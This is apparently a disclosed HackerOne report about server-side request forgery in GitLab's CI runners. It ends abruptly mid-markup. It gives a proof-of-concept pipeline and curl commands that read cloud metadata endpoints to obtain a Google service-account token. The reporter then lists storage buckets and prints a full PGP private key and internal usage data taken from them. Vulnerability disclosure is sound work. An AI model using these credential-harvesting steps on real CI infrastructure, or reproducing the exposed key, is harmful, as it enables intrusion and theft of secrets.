{"id":369451,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8zNjk0NTE=","url":"https://hackerone.com/reports/369451","title":"SSRF in CI after first run","state":"Closed","substate":"resolved","severity_rating":"medium","readable_substate":"Resolved","created_at":"2018-06-21T06:03:43.506Z","submitted_at":"2018-06-21T06:03:43.506Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"plazmaz","url":"/plazmaz","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/QggdQvoxRajRsjpzJJKMnuVh/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a"},"is_me?":false,"cleared":false,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":264,"url":"https://hackerone.com/gitlab","handle":"gitlab","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/000/264/8dd359f496ba6c5b97c5126dc86924a00fd7ef26_original.png/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a","medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/264/8dd359f496ba6c5b97c5126dc86924a00fd7ef26_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"profile":{"name":"GitLab","twitter_handle":"gitlab","website":"https://about.gitlab.com","about":"A single application for the entire software development lifecycle."}},"has_bounty?":true,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":true,"disclosed_at":"2019-04-12T19:57:38.977Z","bug_reporter_agreed_on_going_public_at":"2019-03-13T19:57:38.229Z","team_member_agreed_on_going_public_at":null,"comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"\u003e NOTE! Thanks for submitting a report! Please replace *all* the [square] sections below with the pertinent details. Remember, the more detail you provide, the easier it is for us to triage and respond quickly, so be sure to take your time filling out the report!\n\n**Summary:** \nDuring the first run, the CI pipeline seems to defend against SSRF properly, however when a build is re-run a second time, I am able to access internal metadata endpoints for digitalocean\n\n**Description:**\nThe following resources are accessible on the second run of a CI build. For instance,\n`http://169.254.169.254/metadata/v1.json` \nand `http://169.254.169.254/metadata/v1/`\nare both visible.\n\n\n## Steps To Reproduce:\n\n(Add details for how we can reproduce the issue)\n\n  1. Create a `.gitlab-ci.yml`. This was my PoC:\n\n```\n# This file is a template, and might need editing before it works on your project.\n# Official framework image. Look for the different tagged releases at:\n# https://hub.docker.com/r/library/node/tags/\nimage: node:latest\n\n# This folder is cached between builds\n# http://docs.gitlab.com/ce/ci/yaml/README.html#cache\ncache:\n  paths:\n  - node_modules/\n\ntest:\n  stage: test\n  script:\n    - npm install\n    - npm test\n\npack:\n  stage: deploy\n  script:\n    - chmod +x run.sh\n    - ./run.sh\n    - npm install\n    - npm pack\n  artifacts:\n    paths:\n    - ./*.tgz\n```\n  2. Create a bash file containing this line:  \n```\ncurl -L http://169.254.169.254/metadata/v1/\n```\n  3. Run the build pipeline. It will work as intended with no leaks. Now re-run the build. You should see this output:\n\n```\nid\nhostname  \nuser-data  \nvendor-data  \npublic-keys  \nregion  \ninterfaces/  \ndns/  \nfloating_ip/  \ntags/  \nfeatures/  \n```\nThis indicates access to internal resources, and thus successful SSRF.\n\n## Impact\n\nAny internal resources visible to the node. For gitlab cloud, this looks to be digitalocean metadata, but this will also allow access to any resources the gitlab server can see.","vulnerability_information_html":"\u003cblockquote\u003e\n\u003cp\u003eNOTE! Thanks for submitting a report! Please replace \u003cem\u003eall\u003c/em\u003e the [square] sections below with the pertinent details. Remember, the more detail you provide, the easier it is for us to triage and respond quickly, so be sure to take your time filling out the report!\u003c/p\u003e\n\u003c/blockquote\u003e\n\n\u003cp\u003e\u003cstrong\u003eSummary:\u003c/strong\u003e \u003cbr\u003e\nDuring the first run, the CI pipeline seems to defend against SSRF properly, however when a build is re-run a second time, I am able to access internal metadata endpoints for digitalocean\u003c/p\u003e\n\n\u003cp\u003e\u003cstrong\u003eDescription:\u003c/strong\u003e\u003cbr\u003e\nThe following resources are accessible on the second run of a CI build. For instance,\u003cbr\u003e\n\u003ccode\u003ehttp://169.254.169.254/metadata/v1.json\u003c/code\u003e \u003cbr\u003e\nand \u003ccode\u003ehttp://169.254.169.254/metadata/v1/\u003c/code\u003e\u003cbr\u003e\nare both visible.\u003c/p\u003e\n\n\u003ch2 id=\"steps-to-reproduce\"\u003eSteps To Reproduce:\u003c/h2\u003e\n\n\u003cp\u003e(Add details for how we can reproduce the issue)\u003c/p\u003e\n\n\u003col\u003e\n\u003cli\u003eCreate a \u003ccode\u003e.gitlab-ci.yml\u003c/code\u003e. This was my PoC:\u003c/li\u003e\n\u003c/ol\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003e# This file is a template, and might need editing before it works on your project.\n# Official framework image. Look for the different tagged releases at:\n# https://hub.docker.com/r/library/node/tags/\nimage: node:latest\n\n# This folder is cached between builds\n# http://docs.gitlab.com/ce/ci/yaml/README.html#cache\ncache:\n  paths:\n  - node_modules/\n\ntest:\n  stage: test\n  script:\n    - npm install\n    - npm test\n\npack:\n  stage: deploy\n  script:\n    - chmod +x run.sh\n    - ./run.sh\n    - npm install\n    - npm pack\n  artifacts:\n    paths:\n    - ./*.tgz\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003col\u003e\n\u003cli\u003eCreate a bash file containing this line:\u003cbr\u003e\n\u003ccode\u003e\ncurl -L http://169.254.169.254/metadata/v1/\n\u003c/code\u003e\n\u003c/li\u003e\n\u003cli\u003eRun the build pipeline. It will work as intended with no leaks. Now re-run the build. You should see this output:\u003c/li\u003e\n\u003c/ol\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003eid\nhostname  \nuser-data  \nvendor-data  \npublic-keys  \nregion  \ninterfaces/  \ndns/  \nfloating_ip/  \ntags/  \nfeatures/  \n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eThis indicates access to internal resources, and thus successful SSRF.\u003c/p\u003e\n\n\u003ch2 id=\"impact\"\u003eImpact\u003c/h2\u003e\n\n\u003cp\u003eAny internal resources visible to the node. For gitlab cloud, this looks to be digitalocean metadata, but this will also allow access to any resources the gitlab server can see.\u003c/p\u003e\n","bounty_amount":"3000.0","formatted_bounty":"$3,000","weakness":{"id":68,"name":"Server-Side Request Forgery (SSRF)"},"original_report_id":null,"original_report_url":null,"attachments":[],"allow_singular_disclosure_at":"2019-04-12T19:57:38.347Z","allow_singular_disclosure_after":-54121638.91370331,"singular_disclosure_allowed":true,"vote_count":69,"voters":["spaceraccoon","r00ster","foobar7","mashoud1122","teuvokas","spam404","base_64","mik317","andirrahmani","luizviana","and 59 more..."],"severity":{"rating":"medium","author_type":"Team"},"structured_scope":null,"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"can_edit_custom_fields_attributes":false,"activities":[{"id":2914408,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Quick apology, I completely forgot that your production server was out of scope for testing. I will test on a self-hosted instance in the future.","markdown_message":"\u003cp\u003eQuick apology, I completely forgot that your production server was out of scope for testing. I will test on a self-hosted instance in the future.\u003c/p\u003e\n","automated_response":false,"created_at":"2018-06-21T06:17:13.819Z","updated_at":"2018-06-21T06:17:13.819Z","actor":{"username":"plazmaz","cleared":false,"url":"/plazmaz","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/QggdQvoxRajRsjpzJJKMnuVh/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"gitlab","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2923787,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hello @plazmaz,\n\nThank you for submitting this report. We are currently investigating the issue. Due to our current workload, we will get back with you within the next week with an update.\n\nBest regards,\nGitLab Security Team\n","markdown_message":"\u003cp\u003eHello \u003ca href=\"/plazmaz\"\u003e@plazmaz\u003c/a\u003e,\u003c/p\u003e\n\n\u003cp\u003eThank you for submitting this report. We are currently investigating the issue. Due to our current workload, we will get back with you within the next week with an update.\u003c/p\u003e\n\n\u003cp\u003eBest regards,\u003cbr\u003e\nGitLab Security Team\u003c/p\u003e\n","automated_response":false,"created_at":"2018-06-22T22:14:44.382Z","updated_at":"2018-06-22T22:14:44.382Z","actor":{"username":"asaba","cleared":false,"url":"/asaba","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/261/798/9526c5243e43f554dd0a5b900547c1f5ea6751ea_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"gitlab","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":2954309,"is_internal":false,"editable":false,"type":"Activities::BugNeedsMoreInfo","message":"Hi @plazmaz ,\n\nThank you for submitting this report.\n\nWere you able to discover or access anything sensitive?\n\nNot sure this is necessarily an issue because the whole goal of CI is being flexible enough to run almost any code. That includes making network requests. I'm not seeing anything particularly sensitive in the metadata endpoint (on both GCP and digital ocean).\n\nYou might also check out https://docs.gitlab.com/runner/security/.\n\nBest regards,\nJames\n","markdown_message":"\u003cp\u003eHi \u003ca href=\"/plazmaz\"\u003e@plazmaz\u003c/a\u003e ,\u003c/p\u003e\n\n\u003cp\u003eThank you for submitting this report.\u003c/p\u003e\n\n\u003cp\u003eWere you able to discover or access anything sensitive?\u003c/p\u003e\n\n\u003cp\u003eNot sure this is necessarily an issue because the whole goal of CI is being flexible enough to run almost any code. That includes making network requests. I\u0026#39;m not seeing anything particularly sensitive in the metadata endpoint (on both GCP and digital ocean).\u003c/p\u003e\n\n\u003cp\u003eYou might also check out \u003ca title=\"https://docs.gitlab.com/runner/security/\" href=\"/redirect?url=https%3A%2F%2Fdocs.gitlab.com%2Frunner%2Fsecurity%2F\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://docs.gitlab.com/runner/security/\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e.\u003c/p\u003e\n\n\u003cp\u003eBest regards,\u003cbr\u003e\nJames\u003c/p\u003e\n","automated_response":false,"created_at":"2018-06-28T23:05:48.255Z","updated_at":"2018-06-28T23:05:48.255Z","actor":{"username":"jritchey","cleared":false,"url":"/jritchey","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"gitlab","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":2954520,"is_internal":false,"editable":false,"type":"Activities::BugNew","message":"Hi, to begin with, I want to point out that since you can't accurately predict where your runners will be spun up, and you already have a setting in gitlab for allowing/disallowing requests to local IPs, it's probably worthwhile to either utilize that or another similar setting for runners.\n\nThat being said, I did some poking around. I'm not entirely positive what you're using this key for, but it seems to persist across runs w/ different worker tokens. To begin with, I got a service account token from Google using\n`curl -H \"Metadata-Flavor: Google\" http://metadata.google.internal/computeMetadata/v1beta1/instance/service-accounts/default/token`\n\nOnce I acquired a token, I took a look at the scopes I was granted access to using\n`https://www.googleapis.com/oauth2/v1/tokeninfo`\nwhich returned\n```\n{\n \"issued_to\": \"102819444208887523631\",\n \"audience\": \"102819444208887523631\",\n \"scope\": \"https://www.googleapis.com/auth/devstorage.read_only https://www.googleapis.com/auth/monitoring.write https://www.googleapis.com/auth/logging.write\",\n \"expires_in\": 3499,\n \"access_type\": \"offline\"\n}\n```\n\nAfter digging into Google's storage APIs, https://cloud.google.com/storage/docs/json_api/v1/, I queried a list of buckets using a project id from ` http://metadata.google.internal/computeMetadata/v1/project/project-id`:\n\n`https://www.googleapis.com/storage/v1/b?access_token=xxx\u0026project=gitlab-ci-155816`\nwhich returned\n```\n{\n \"kind\": \"storage#buckets\",\n \"items\": [\n  {\n   \"kind\": \"storage#bucket\",\n   \"id\": \"gitlab-ci-usage-outputs\",\n   \"selfLink\": \"https://www.googleapis.com/storage/v1/b/gitlab-ci-usage-outputs\",\n   \"projectNumber\": \"62632269664\",\n   \"name\": \"gitlab-ci-usage-outputs\",\n   \"timeCreated\": \"2017-02-14T21:05:50.570Z\",\n   \"updated\": \"2017-02-14T21:06:38.915Z\",\n   \"metageneration\": \"2\",\n   \"location\": \"US-EAST1\",\n   \"storageClass\": \"REGIONAL\",\n   \"etag\": \"CAI=\"\n  },\n  {\n   \"kind\": \"storage#bucket\",\n   \"id\": \"gitlab-runner-secrets\",\n   \"selfLink\": \"https://www.googleapis.com/storage/v1/b/gitlab-runner-secrets\",\n   \"projectNumber\": \"62632269664\",\n   \"name\": \"gitlab-runner-secrets\",\n   \"timeCreated\": \"2018-06-06T15:01:29.662Z\",\n   \"updated\": \"2018-06-06T15:01:29.662Z\",\n   \"metageneration\": \"1\",\n   \"location\": \"US-CENTRAL1\",\n   \"storageClass\": \"REGIONAL\",\n   \"etag\": \"CAE=\"\n  }\n ]\n}\n```\n\nI was able to list the bucket contents using\n`https://www.googleapis.com/storage/v1/b/gitlab-runner-secrets/o?access_token=xxxx`\n(note that we've lost the project-specificity here)\nwhich showed me I had access to dowload\n `package_signing.gpg`\n\nThis provides the following private key for `GitLab Runner test key`.\n```\n-----BEGIN PGP PRIVATE KEY BLOCK-----\n\nlQPGBFsX+NoBCADB3uIyOHGIUmDjIXQ6BRGDC/VNqiQ0qr3OMAR+6LSUJbKktKFz\nX3Am05X2BU3RwLvmNxwPCvP+6mY3QlTpLRgVGZYpkv/H1hor65NmbbQBm6CH7lBP\nGYC0OAgcm3tWja2fM7XoCI3apZeglp5WdraUzOQW70r0nDEmP7MrLW8GFiIC/05k\nt8cNZZHOiL1k41btUEmodivuLFcQCGyX0jmPveh3fV0GBaJtbQI4AzD5yagK9uwk\nPY6+FGzjFLX+YVOpP6etRm3Cwa3Yttm9BUktqeIMsK/hKqmW1VCd8uTobRtuNM+v\n8ySLsMx6y0iX0aUFp6LNC5yFfJweP/LB8jB5ABEBAAH+BwMC76eO2W+CyYXq2Rer\nbo9RTTXv7uYHYEyWu4fOxzpYCDJbFbK/9OoLFF31PW6D0XD2bTlZ9/F0uPIL2bKN\nVE1qDhxddT4Ojm8/vA+maraq4+aZq6o8CYP6H+F1Sun8GchKDa8wJLOlspJFu/Xh\nVf6OwHXkoCg78bFRjq32H2p1cRn5J88fjKSUzUVF4j6eX+3tt76GWCNNmMADF+sP\nD+SSWXGYVJhOQB2cvUNwLyS0i5lIflUamnPSrtexbyKp5VPWz0emwzCkqs/avFBf\nTDivi+ebICPXG5nId70BXF7CUr7kwmx4m2R8zFs6Btk5dQzFLKFr2r82hr3f7r1p\nWHUzZP6MMwllcNwM6P4ZIFF/1saDRWKHdLuBvkREZsmZpoKJFW0QiN2IiTzBIWsj\n4UBVgnfPMc6EEEDZZQrcL6L0i6sznGwHZgQs6u78FfzCwLkClG1fGImhhxPhnkGL\nxVpILEIx3uPvBdvHNeDOmJjUZg8Q8Opb7Pj+DwAPzh5AYWKXvVDCUBDX3mqaOWe8\n80N01wRn3dGyLWE9NsVnodhGofpYzM7GUxX6aoXtwgWs/x6B6IJxvV0fBpsrCeET\nr9Es8ZbaBXoH0+aofkSxeejE+NHpyw2Q632Np4f/9P9TVonCa1Dq7u12jtMl4pHT\n6I1vB9ykzilA0+7Xre8rRxnIHFcw7x1of+H/i9lVcrD9f/PjYfD6XcIKNsSaFcJU\nL9J2GI4KxkG4nicMOzM0c+w/qnqP69cB26w9+wNbyQM4MWupfHaMNeyokqOz6VQZ\nxxUiPkUNqJtF8kP+hHthzRwjRmr2d3YKlRDbngpHIfVlZ1CcE7afN9+XZTO320eT\nu4MXa+s1l4ZHtFKshDNeK/IuID5oRsUvnEGsUPW/531usnxRp313EQpVSb5BqiGe\nYlfB49plZLXxtBZHaXRMYWIgUnVubmVyIHRlc3Qga2V5iQFUBBMBCAA+AhsDBQsJ\nCAcCBhUKCQgLAgQWAgMBAh4BAheAFiEEaAhbBjmSPwpLysIFVEefMKwQuioFAlsX\n+WsFCQAk6pEACgkQVEefMKwQuioMLwf+JPsxD/3FJo2sWylo9HHM20i3HQP/WQGn\nwokmKwHWX2h/ipCE07jU7lYRRr2+/u7TmNKb5XfO/1kocIuA/5k+FNYistcch/P0\nw8gCPDACTGZj+AyMdT8+Pe6Svx8DUkzlen4X2irK9udqle03ow6r/DiT3+Nhm1NN\nOAWjdeS/kgiQxxlQdkJrwDC9wpTVggOzhkM9ru7R0AMzdxnfgVWE05erkI7753G/\ni2PnfVlwEZEKNvtAUSASwKmR3G9FmZjbi+R0usZ0+TSBuf89u3ii5k54JRQSh0+h\nr7S/IdWscruKaKuoqQVRhz0yuwhyotmspVb6n5RAdftuRSrlK4yM+Q==\n=kGb8\n-----END PGP PRIVATE KEY BLOCK-----\n```\n\n It's likely this is just a test key, but these are some examples of sensitive data. A few other bits of info I found:\nGlobal bucket containing a large amount (probably all) of your runtime metrics:\n`https://www.googleapis.com/download/storage/v1/b/gitlab-ci-usage-outputs`\nreturns many files, each containing info along these lines\n```\n2018-06-27,com.google.cloud/services/compute-engine/NetworkInternetIngressNaNa,437807272,bytes,https://www.googleapis.com/compute/v1/projects/gitlab-ci-155816/zones/us-east1-d/instances/runner-fa6cab46-srm-1530103488-7d6cd1c6,6781573918892111916,us-east1-d\n2018-06-27,com.google.cloud/services/compute-engine/NetworkInternetIngressCnNa,200,bytes,https://www.googleapis.com/compute/v1/projects/gitlab-ci-155816/zones/us-east1-d/instances/runner-fa6cab46-srm-1530103488-7d6cd1c6,6781573918892111916,us-east1-d\n2018-06-27,com.google.cloud/services/compute-engine/NetworkInternetIngressApacNa,80,bytes,https://www.googleapis.com/compute/v1/projects/gitlab-ci-155816/zones/us-east1-d/instances/runner-fa6cab46-srm-1530103488-7d6cd1c6,6781573918892111916,us-east1-d\n2018-06-27,com.google.cloud/services/compute-engine/NetworkIntraZoneIngress,26396877,bytes,https://www.googleapis.com/compute/v1/projects/gitlab-ci-155816/zones/us-east1-d/instances/runner-fa6cab46-srm-1530103488-7d6cd1c6,6781573918892111916,us-east1-d\n2018-06-27,com.google.cloud/services/compute-engine/Licensed1000208Ram,3277060046848,byte-seconds\n...\netc\n```\nAs well as global public keys:\n`http://metadata.google.internal/computeMetadata/v1beta1/project/attributes/ssh-key`\nreturns\n```\ntomasz:ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAHRDPRmo9+dYMzI3VJP/oD4Miwut5P2c3kyMhUEhV3Rz6bt7TwOaYLacpZ6eOJ+RfCda4cCMiDdS209uUrJzmvtXoh620XF79u7diX1laNYX1fxCwqiyPSmXiNTbeiWql11CLTRVstNaHjyjSHfOxMz6T+PS9rokrNwzsYwmU8m0C0u6CjXMVjWrOZBbBVC6ZC059fZSpwXyOkwMl2BNZ4SQHTb5CBsTNrTyT4hgeU45aZ+AkpbQIsOYlf0JFj9p+BwFvI6d5HKrKoHuvY1ybjSrNroTr5nl5SbHaIYvVWFHVY1FW/eZI2yeDMfJmRPu6LhdQGv7L3jYhZPbhnhTlC8= google-ssh {\"userName\":\"tomasz@gitlab.com\",\"expireOn\":\"2018-06-04T21:47:59+0000\"}\ntomasz:ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBDLtucKrHDdA37CI45Y7SnCMBDw31BLu+L4sk6JltWqRL1gbrURmojXCfnepqNub8UinNKcAqOF5P1oeaA9zmx8= google-ssh {\"userName\":\"tomasz@gitlab.com\",\"expireOn\":\"2018-06-04T21:47:56+0000\"}\n```\nWhile none of this info is critical as far as I can tell, it is sensitive and I shouldn't have access to it. But like the rest of GitLab, runners can be spun up outside of your environment. What makes the threat here any different from other SSRF vulnerabilities?","markdown_message":"\u003cp\u003eHi, to begin with, I want to point out that since you can\u0026#39;t accurately predict where your runners will be spun up, and you already have a setting in gitlab for allowing/disallowing requests to local IPs, it\u0026#39;s probably worthwhile to either utilize that or another similar setting for runners.\u003c/p\u003e\n\n\u003cp\u003eThat being said, I did some poking around. I\u0026#39;m not entirely positive what you\u0026#39;re using this key for, but it seems to persist across runs w/ different worker tokens. To begin with, I got a service account token from Google using\u003cbr\u003e\n\u003ccode\u003ecurl -H \u0026quot;Metadata-Flavor: Google\u0026quot; http://metadata.google.internal/computeMetadata/v1beta1/instance/service-accounts/default/token\u003c/code\u003e\u003c/p\u003e\n\n\u003cp\u003eOnce I acquired a token, I took a look at the scopes I was granted access to using\u003cbr\u003e\n\u003ccode\u003ehttps://www.googleapis.com/oauth2/v1/tokeninfo\u003c/code\u003e\u003cbr\u003e\nwhich returned\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003e{\n \u0026quot;issued_to\u0026quot;: \u0026quot;102819444208887523631\u0026quot;,\n \u0026quot;audience\u0026quot;: \u0026quot;102819444208887523631\u0026quot;,\n \u0026quot;scope\u0026quot;: \u0026quot;https://www.googleapis.com/auth/devstorage.read_only https://www.googleapis.com/auth/monitoring.write https://www.googleapis.com/auth/logging.write\u0026quot;,\n \u0026quot;expires_in\u0026quot;: 3499,\n \u0026quot;access_type\u0026quot;: \u0026quot;offline\u0026quot;\n}\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eAfter digging into Google\u0026#39;s storage APIs, \u003ca title=\"https://cloud.google.com/storage/docs/json_api/v1/\" href=\"/redirect?url=https%3A%2F%2Fcloud.google.com%2Fstorage%2Fdocs%2Fjson_api%2Fv1%2F\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://cloud.google.com/storage/docs/json_api/v1/\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e, I queried a list of buckets using a project id from \u003ccode\u003ehttp://metadata.google.internal/computeMetadata/v1/project/project-id\u003c/code\u003e:\u003c/p\u003e\n\n\u003cp\u003e\u003ccode\u003ehttps://www.googleapis.com/storage/v1/b?access_token=xxx\u0026amp;project=gitlab-ci-155816\u003c/code\u003e\u003cbr\u003e\nwhich returned\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003e{\n \u0026quot;kind\u0026quot;: \u0026quot;storage#buckets\u0026quot;,\n \u0026quot;items\u0026quot;: [\n  {\n   \u0026quot;kind\u0026quot;: \u0026quot;storage#bucket\u0026quot;,\n   \u0026quot;id\u0026quot;: \u0026quot;gitlab-ci-usage-outputs\u0026quot;,\n   \u0026quot;selfLink\u0026quot;: \u0026quot;https://www.googleapis.com/storage/v1/b/gitlab-ci-usage-outputs\u0026quot;,\n   \u0026quot;projectNumber\u0026quot;: \u0026quot;62632269664\u0026quot;,\n   \u0026quot;name\u0026quot;: \u0026quot;gitlab-ci-usage-outputs\u0026quot;,\n   \u0026quot;timeCreated\u0026quot;: \u0026quot;2017-02-14T21:05:50.570Z\u0026quot;,\n   \u0026quot;updated\u0026quot;: \u0026quot;2017-02-14T21:06:38.915Z\u0026quot;,\n   \u0026quot;metageneration\u0026quot;: \u0026quot;2\u0026quot;,\n   \u0026quot;location\u0026quot;: \u0026quot;US-EAST1\u0026quot;,\n   \u0026quot;storageClass\u0026quot;: \u0026quot;REGIONAL\u0026quot;,\n   \u0026quot;etag\u0026quot;: \u0026quot;CAI=\u0026quot;\n  },\n  {\n   \u0026quot;kind\u0026quot;: \u0026quot;storage#bucket\u0026quot;,\n   \u0026quot;id\u0026quot;: \u0026quot;gitlab-runner-secrets\u0026quot;,\n   \u0026quot;selfLink\u0026quot;: \u0026quot;https://www.googleapis.com/storage/v1/b/gitlab-runner-secrets\u0026quot;,\n   \u0026quot;projectNumber\u0026quot;: \u0026quot;62632269664\u0026quot;,\n   \u0026quot;name\u0026quot;: \u0026quot;gitlab-runner-secrets\u0026quot;,\n   \u0026quot;timeCreated\u0026quot;: \u0026quot;2018-06-06T15:01:29.662Z\u0026quot;,\n   \u0026quot;updated\u0026quot;: \u0026quot;2018-06-06T15:01:29.662Z\u0026quot;,\n   \u0026quot;metageneration\u0026quot;: \u0026quot;1\u0026quot;,\n   \u0026quot;location\u0026quot;: \u0026quot;US-CENTRAL1\u0026quot;,\n   \u0026quot;storageClass\u0026quot;: \u0026quot;REGIONAL\u0026quot;,\n   \u0026quot;etag\u0026quot;: \u0026quot;CAE=\u0026quot;\n  }\n ]\n}\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eI was able to list the bucket contents using\u003cbr\u003e\n\u003ccode\u003ehttps://www.googleapis.com/storage/v1/b/gitlab-runner-secrets/o?access_token=xxxx\u003c/code\u003e\u003cbr\u003e\n(note that we\u0026#39;ve lost the project-specificity here)\u003cbr\u003e\nwhich showed me I had access to dowload\u003cbr\u003e\n \u003ccode\u003epackage_signing.gpg\u003c/code\u003e\u003c/p\u003e\n\n\u003cp\u003eThis provides the following private key for \u003ccode\u003eGitLab Runner test key\u003c/code\u003e.\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003e-----BEGIN PGP PRIVATE KEY BLOCK-----\n\nlQPGBFsX+NoBCADB3uIyOHGIUmDjIXQ6BRGDC/VNqiQ0qr3OMAR+6LSUJbKktKFz\nX3Am05X2BU3RwLvmNxwPCvP+6mY3QlTpLRgVGZYpkv/H1hor65NmbbQBm6CH7lBP\nGYC0OAgcm3tWja2fM7XoCI3apZeglp5WdraUzOQW70r0nDEmP7MrLW8GFiIC/05k\nt8cNZZHOiL1k41btUEmodivuLFcQCGyX0jmPveh3fV0GBaJtbQI4AzD5yagK9uwk\nPY6+FGzjFLX+YVOpP6etRm3Cwa3Yttm9BUktqeIMsK/hKqmW1VCd8uTobRtuNM+v\n8ySLsMx6y0iX0aUFp6LNC5yFfJweP/LB8jB5ABEBAAH+BwMC76eO2W+CyYXq2Rer\nbo9RTTXv7uYHYEyWu4fOxzpYCDJbFbK/9OoLFF31PW6D0XD2bTlZ9/F0uPIL2bKN\nVE1qDhxddT4Ojm8/vA+maraq4+aZq6o8CYP6H+F1Sun8GchKDa8wJLOlspJFu/Xh\nVf6OwHXkoCg78bFRjq32H2p1cRn5J88fjKSUzUVF4j6eX+3tt76GWCNNmMADF+sP\nD+SSWXGYVJhOQB2cvUNwLyS0i5lIflUamnPSrtexbyKp5VPWz0emwzCkqs/avFBf\nTDivi+ebICPXG5nId70BXF7CUr7kwmx4m2R8zFs6Btk5dQzFLKFr2r82hr3f7r1p\nWHUzZP6MMwllcNwM6P4ZIFF/1saDRWKHdLuBvkREZsmZpoKJFW0QiN2IiTzBIWsj\n4UBVgnfPMc6EEEDZZQrcL6L0i6sznGwHZgQs6u78FfzCwLkClG1fGImhhxPhnkGL\nxVpILEIx3uPvBdvHNeDOmJjUZg8Q8Opb7Pj+DwAPzh5AYWKXvVDCUBDX3mqaOWe8\n80N01wRn3dGyLWE9NsVnodhGofpYzM7GUxX6aoXtwgWs/x6B6IJxvV0fBpsrCeET\nr9Es8ZbaBXoH0+aofkSxeejE+NHpyw2Q632Np4f/9P9TVonCa1Dq7u12jtMl4pHT\n6I1vB9ykzilA0+7Xre8rRxnIHFcw7x1of+H/i9lVcrD9f/PjYfD6XcIKNsSaFcJU\nL9J2GI4KxkG4nicMOzM0c+w/qnqP69cB26w9+wNbyQM4MWupfHaMNeyokqOz6VQZ\nxxUiPkUNqJtF8kP+hHthzRwjRmr2d3YKlRDbngpHIfVlZ1CcE7afN9+XZTO320eT\nu4MXa+s1l4ZHtFKshDNeK/IuID5oRsUvnEGsUPW/531usnxRp313EQpVSb5BqiGe\nYlfB49plZLXxtBZHaXRMYWIgUnVubmVyIHRlc3Qga2V5iQFUBBMBCAA+AhsDBQsJ\nCAcCBhUKCQgLAgQWAgMBAh4BAheAFiEEaAhbBjmSPwpLysIFVEefMKwQuioFAlsX\n+WsFCQAk6pEACgkQVEefMKwQuioMLwf+JPsxD/3FJo2sWylo9HHM20i3HQP/WQGn\nwokmKwHWX2h/ipCE07jU7lYRRr2+/u7TmNKb5XfO/1kocIuA/5k+FNYistcch/P0\nw8gCPDACTGZj+AyMdT8+Pe6Svx8DUkzlen4X2irK9udqle03ow6r/DiT3+Nhm1NN\nOAWjdeS/kgiQxxlQdkJrwDC9wpTVggOzhkM9ru7R0AMzdxnfgVWE05erkI7753G/\ni2PnfVlwEZEKNvtAUSASwKmR3G9FmZjbi+R0usZ0+TSBuf89u3ii5k54JRQSh0+h\nr7S/IdWscruKaKuoqQVRhz0yuwhyotmspVb6n5RAdftuRSrlK4yM+Q==\n=kGb8\n-----END PGP PRIVATE KEY BLOCK-----\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eIt\u0026#39;s likely this is just a test key, but these are some examples of sensitive data. A few other bits of info I found:\u003cbr\u003e\nGlobal bucket containing a large amount (probably all) of your runtime metrics:\u003cbr\u003e\n\u003ccode\u003ehttps://www.googleapis.com/download/storage/v1/b/gitlab-ci-usage-outputs\u003c/code\u003e\u003cbr\u003e\nreturns many files, each containing info along these lines\u003c/p\u003e\n\u003cdiv 